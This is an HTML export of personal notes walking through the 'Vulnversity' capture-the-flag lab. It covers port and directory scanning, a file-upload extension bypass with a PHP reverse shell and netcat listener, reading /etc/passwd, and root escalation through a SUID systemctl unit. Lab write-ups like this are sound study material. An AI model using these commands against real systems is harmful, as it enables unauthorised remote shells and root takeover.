<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>vulnversity</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>vulnversity</h1><br/><p><strong>Vulnversity</strong></p><p></p><p>Hello</p><p></p><p>Scan for Open Ports in nmap</p><p></p><p>nmap -sV -O -p- &lt;IP Address&gt;</p><p></p><p><img src="images/3-1.png" alt="images/3-1.png" /></p><p></p><p>Enumerate Directories on the web server using Gobuster.</p><p></p><p><table class="table"><tr><th>GoBuster flag</th><th>Description</th></tr><tr><td>-e</td><td>Print the full URLs in your console</td></tr><tr><td>-u</td><td>The target URL</td></tr><tr><td>-w</td><td>Path to your wordlist</td></tr><tr><td>-U and -P</td><td>Username and Password for Basic Auth</td></tr><tr><td>-p &lt;x&gt;</td><td>Proxy to use for requests</td></tr><tr><td>-c &lt;http cookies&gt;</td><td>Specify a cookie for simulating your auth</td></tr></table></p><p></p><p></p><p>gobuster dir -u <a href="http://10.10.0.155:3333">http://10.10.0.155:3333</a> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt</p><p></p><p><img src="images/3-2.png" alt="images/3-2.png" /></p><p></p><p>We note that PHP extension is blocked for upload.</p><p>Use the burpsuite Intruder</p><p>We&#39;re going to use Intruder (used for automating customised attacks).</p><p></p><p>To begin, make a wordlist with the following extensions in:</p><p></p><p><img src="images/3-3.png" alt="images/3-3.png" /></p><p></p><p><img src="images/3-4.png" alt="images/3-4.png" /></p><p></p><p>Seeing the burpsuite intruder result, we check the length and conclude, <strong>phtml</strong> extention might be allowed.</p><p></p><p>We get the PHP reverse shell at https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php</p><p></p><p>We make the necessary changes to IP and PORT. Then rename the <strong>php-reverse-shell.php</strong> file to <strong>php-reverse-shell.phtml</strong></p><p></p><p>Then we upload it to the webserver.</p><p></p><p>Start the netcat listener: nc -lvnp 7777 (Port mentioned in reverse shell file)</p><p>Then run the reverse shell by: <a href="http://10.10.0.155:3333/internal/uploads/php-reverse-shell.phtml">http://10.10.0.155:3333/internal/uploads/php-reverse-shell.phtml</a></p><p></p><p>In the received shell,</p><p>cat /etc/passwd</p><p></p><p>To know to user who manages this webserver.</p><p>cd /home/jill</p><p>cat user.txt</p><p></p><p>We get the user flag.</p><p></p><p>For Root:</p><p></p><p>find / -type f -perm -04000 2&gt;/dev/null</p><p>or</p><p>find / -user root -perm -4000 -exec ls -ldb {} \;</p><p>search all suid set files</p><p></p><p>We find <strong>/bin/systemctl</strong> has SUID bit set.</p><p></p><p>Use GTFOBins and run the following.</p><p></p><p>TF=$(mktemp).service</p><p></p><p>echo &#39;[Service]</p><p>Type=oneshot</p><p>ExecStart=/bin/sh -c &quot;id &gt; /tmp/output&quot;</p><p>[Install]</p><p>WantedBy=multi-user.target&#39; &gt; $TF</p><p></p><p>systemctl link $TF</p><p>systemctl enable --now $TF</p><p></p><p></p><p>The above will run id command as root and store the output in /tmp/output file.</p><p></p><p>Change your commands after -c to ls /root then cat the flag etc</p><p>or</p><p>we can run a reverse shell after -c on a different port and listen in netcat to have a root shell.</p><p></p><p>We get the root flag in both ways.</p><p></p><p>Thanks !!</p></div>
</body>
</html>
